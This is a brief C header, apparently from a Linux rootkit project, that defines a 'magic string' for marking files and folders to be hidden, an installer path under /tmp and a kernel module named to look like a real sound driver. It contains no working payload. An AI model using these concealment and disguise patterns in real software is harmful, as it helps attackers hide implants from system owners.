/*
 * Author: Daniel Liscinsky
 */



/**
 * A cryptographically secure string used to mark sensitive items, 
 * like files and folders which should be hidden.
 * 
 * Generated using OpenSSL command: openssl rand -hex 16
 * 
 * This string should be completely unguessable by the adversary. 
 * Even if the adversary learns this magic string, it should not be 
 * a big problem or endanger the security of operations/code; a 
 * potential consequence might be that they might be able to identify, 
 * find, or determine the existance of items which were meant to 
 * remain hidden.
 */
#define MAGIC_STR "828db6a29e08d2bc967fee35d311da78"



#define LINUX_INSTALLER_NAME "lins_" MAGIC_STR
#define LINUX_INSTALLER_FILEPATH "/tmp/" LINUX_INSTALLER_NAME

#define KO_MODULE_NAME "snd_ens1372"